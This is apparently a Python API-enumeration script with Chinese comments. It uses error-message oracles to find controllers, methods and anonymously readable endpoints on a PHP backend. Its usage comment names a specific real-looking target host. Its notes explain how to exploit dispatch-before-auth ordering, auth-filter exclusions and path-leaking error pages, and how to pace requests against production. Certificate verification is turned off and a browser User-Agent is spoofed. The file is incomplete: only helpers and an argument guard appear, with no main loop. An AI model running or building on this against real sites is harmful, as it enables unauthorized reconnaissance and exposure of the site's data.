#!/usr/bin/env python3
# 见 attack-files 或本机 out/enum_api_oracle.py
import argparse, ssl, time, urllib.request, concurrent.futures
# ---- 参数守卫（无参数必须给出人话，不抛 traceback、不朝真实目标发包）----
import sys as _sys, os as _os
if len(_sys.argv) < 2:
    _u = '<参数...>'
    print("用法: " + _os.path.basename(__file__) + " " + _u, file=_sys.stderr)
    raise SystemExit(1)
# ---- 守卫结束 ----

CTX = ssl._create_unverified_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36"
SENTINEL = "zzqq_not_exist_1a2b"

def get(url):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=12, context=CTX) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, "ERR:" + str(e)[:60]

def classify(body):
    if "Failed opening controller script" in body: return "no-controller"
    if "There is no method" in body: return "no-method"
    if '"error_code":0' in body or '"code":0' in body: return "ANON-OK"
    if any(k in body for k in ("token不存在","请先登录","无效的token","登录已过期")): return "auth-required"
    return "other"

# 用法：
# python3 enum_api_oracle.py --base https://m.7799520.com/api --platform wap \
#   --modules user,party,dynamic,news,center --controllers index,user,list,party,news --methods methods.txt
#
# 三态判据（实测）：
#   no-controller : 516 Failed opening controller script .../<ctl>.php   -> 控制器不存在（顺带泄内部绝对路径）
#   no-method     : 517 There is no method <m>Action in <Ctl>Controller   -> 控制器存在、方法不存在
#   auth-required : -9 请先登录 / token不存在                             -> 方法存在、需登录
#   ANON-OK       : error_code=0 正常 JSON                                -> 匿名可读，重点
#
# 关键经验：
# 1) 有些模块「先分发后鉴权」（user/party/dynamic/news），可用 517 枚举方法；
#    另一些模块「先鉴权后分发」（center/gift），任何方法都只回 请先登录，枚举无意义。
# 2) 有些前缀被排除在鉴权过滤器之外（如 api.crm 的 /api/<ctl>/<method>），错误回显直接给绝对路径。
# 3) 必须限速（4 并发 + 0.1s 间隔）；生产环境建议 2 并发 + 0.3s。

